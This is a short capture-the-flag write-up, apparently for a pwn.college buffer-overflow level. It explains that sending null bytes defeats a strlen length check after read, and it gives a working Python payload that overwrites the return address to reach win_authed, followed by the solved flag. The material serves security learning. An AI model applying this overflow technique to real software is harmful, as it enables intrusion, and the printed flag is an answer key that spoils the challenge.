In this challenge the program makes sure that the input buffer is not very long. 

But there is a way to bypass that check. 

    1ea5:	e8 16 f3 ff ff       	call   11c0 <read@plt>
    1eaa:	89 45 ec             	mov    DWORD PTR [rbp-0x14],eax
    1ead:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
    1eb1:	48 89 c7             	mov    rdi,rax
    1eb4:	e8 c7 f2 ff ff       	call   1180 <strlen@plt>
    1eb9:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
    1ebd:	48 83 7d e0 73       	cmp    QWORD PTR [rbp-0x20],0x73
    1ec2:	76 1f                	jbe    1ee3 <challenge+0x18d>
    1ec4:	48 8d 0d 1d 13 00 00 	lea    rcx,[rip+0x131d]        # 31e8 <__PRETTY_FUNCTION__.5714>
    1ecb:	ba 4f 00 00 00       	mov    edx,0x4f
    1ed0:	48 8d 35 49 12 00 00 	lea    rsi,[rip+0x1249]        # 3120 <_IO_stdin_used+0x120>
    1ed7:	48 8d 3d 98 12 00 00 	lea    rdi,[rip+0x1298]        # 3176 <_IO_stdin_used+0x176>
    1ede:	e8 bd f2 ff ff       	call   11a0 <__assert_fail@plt>
    1ee3:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]

This program uses `read` syscall to read from stdin and then it uses `strlen` to calculate its size. 
`strlen` finds the first null character and returns its offset from the first character. 
`read` syscall only stops taking input when all the buffers are filled. But since we will send our input through a pipe we do not have to enter count bytes.

Now we can find the offset of return address from the input buffer then fill the buffer with null characters

The address we want to jump in win_authed() function is 0x15cc which can be found using objdump. 
The offset can be found using gdb

    python -c 'import sys, time; sys.stdout.buffer.write(b"200"); time.sleep(1); sys.stdout.buffer.write(b"A"*8+b"\x00"*160 + b"\x55\x1c")'

The flag 

    pwn.college{UqyRjuxhBwVGZJKYtDl0kZEes1t.0FNwMDL5kzM1czW}


